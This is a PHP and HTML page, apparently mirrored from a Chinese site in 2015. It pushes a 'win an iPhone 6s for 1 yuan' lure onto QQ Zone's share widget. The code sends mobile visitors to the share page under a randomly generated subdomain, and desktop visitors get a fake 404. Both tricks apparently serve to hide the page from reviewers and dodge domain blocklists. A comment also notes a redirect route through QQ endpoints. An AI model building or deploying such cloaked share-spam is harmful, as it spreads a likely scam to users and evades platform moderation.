<?php

function is_mobile(){
    return true;
    //正则表达式,批配不同手机浏览器UA关键词。
    $regex_match="/(nokia|iphone|android|motorola|^mot\-|softbank|foma|docomo|kddi|up\.browser|up\.link|";

    $regex_match.="htc|dopod|blazer|netfront|helio|hosin|huawei|novarra|CoolPad|webos|techfaith|palmsource|";

    $regex_match.="blackberry|alcatel|amoi|ktouch|nexian|samsung|^sam\-|s[cg]h|^lge|ericsson|philips|sagem|wellcom|bunjalloo|maui|";

    $regex_match.="symbian|smartphone|midp|wap|phone|windows ce|iemobile|^spice|^bird|^zte\-|longcos|pantech|gionee|^sie\-|portalmmm|";

    $regex_match.="jig\s browser|hiptop|^ucweb|^benq|haier|^lct|opera\s*mobi|opera\*mini|320x320|240x320|176x220";

    $regex_match.=")/i";

    return isset($_SERVER['HTTP_X_WAP_PROFILE']) or isset($_SERVER['HTTP_PROFILE']) or preg_match($regex_match, strtolower($_SERVER['HTTP_USER_AGENT'])); //如果UA中存在上面的关键词则返回真。

}
function GetUrlToDomain($domain)
{
    $re_domain = '';
    $domain_postfix_cn_array = array("com", "net", "org", "gov", "edu", "com.cn", "cn", "dev");
    $array_domain = explode(".", $domain);
    $array_num = count($array_domain) - 1;
    if ($array_domain[$array_num] == 'cn') {
        if (in_array($array_domain[$array_num - 1], $domain_postfix_cn_array)) {
            $re_domain = $array_domain[$array_num - 2] . "." . $array_domain[$array_num - 1] . "." . $array_domain[$array_num];
        } else {
            $re_domain = $array_domain[$array_num - 1] . "." . $array_domain[$array_num];
        }
    } else {
        $re_domain = $array_domain[$array_num - 1] . "." . $array_domain[$array_num];
    }
    return $re_domain;
}

$url = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
$domain = GetUrlToDomain($url);
$letter = 'abcdefghijklmnopqrstuvwxyz123456789';
$len = mb_strlen($letter);
$randWord = '';
for ($i=0;$i<3;$i++) {
    $randWord .= $letter[mt_rand(1,$len-1)];
}
$domain = $randWord.'.'.$domain;
$did = !empty($_GET['did']) ? $_GET['did'] : 0;
$shareUrl = 'http://'.$domain.'/qzone/wzs/result.html?s=1&did='.$did;
if (is_mobile()) {

}else{
    header( "HTTP/1.1 404 PAGE NOT FOUND");
    exit;
}

?>
<!doctype html>
<html lang="en">

<!-- Mirrored  by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 15 Nov 2015 10:03:55 GMT -->
<head>
    <meta charset="UTF-8">
    <meta name="Generator" content="EditPlus®">
    <meta name="Author" content="">
    <meta name="Keywords" content="">
    <meta name="Description" content="">
    <title> </title>
</head>
<body>
<script type="text/javascript">
    {window.location.href="http://qzs.qzone.qq.com/open/connect/widget/mobile/qzshare/index.html?url="+
        encodeURIComponent('<?php echo $domain ?>')+"&showcount=0&desc="+
        encodeURIComponent('不错的网站 很有创意 1元就能买到我想要的东西!')+"&summary="+
        encodeURIComponent('6大诚信认证，放心购物.点击进入 抢iphone6s！')+"&title="+
        encodeURIComponent('小伙伴们，快来，伙购网全新上线，1元就能伙购到iphone6S！')+"&site="+
        encodeURIComponent('奖品大放送')+"&pics="+
        encodeURIComponent('https://img.alicdn.com/imgextra/i2/182070159072665895/TB24xNwjpXXXXbqXpXXXXXXXXXX_!!0-martrix_bbs.jpg')+"&style=102&width=145&height=30&otype=share"}
</script>
<!--  urlb.partravel.cn 通过https htdata2.qq.com/cgi-bin/httpconn?htcmd=0x6ff0080&u= 没用https  -->

</body>

<!-- Mirrored from hao1.tianx66.cn/zf.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 15 Nov 2015 10:03:59 GMT -->
</html>